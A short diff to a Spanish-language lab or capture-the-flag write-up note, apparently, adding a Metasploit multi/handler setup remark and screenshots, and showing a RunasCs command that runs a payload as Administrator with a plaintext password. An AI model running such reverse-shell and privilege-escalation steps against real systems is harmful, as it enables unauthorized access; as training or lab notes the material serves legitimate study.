@@ -140,10 +140,13 @@ creamos un payload que nos permita conectarnos a la maquina y con un servidor en
 ![[Pasted image 20240514212432.png]]
 
 ### /multi/handler
-
+vamos a setear el multi
 ![[Pasted image 20240514212756.png]]
 
+![[Pasted image 20240514214404.png]]
 
+
+![[Pasted image 20240514214353.png]]
 
 ![[Pasted image 20240514214337.png]]
 .\RunasCs.exe Administrator ThisPasswordShouldDo!@ root.exe
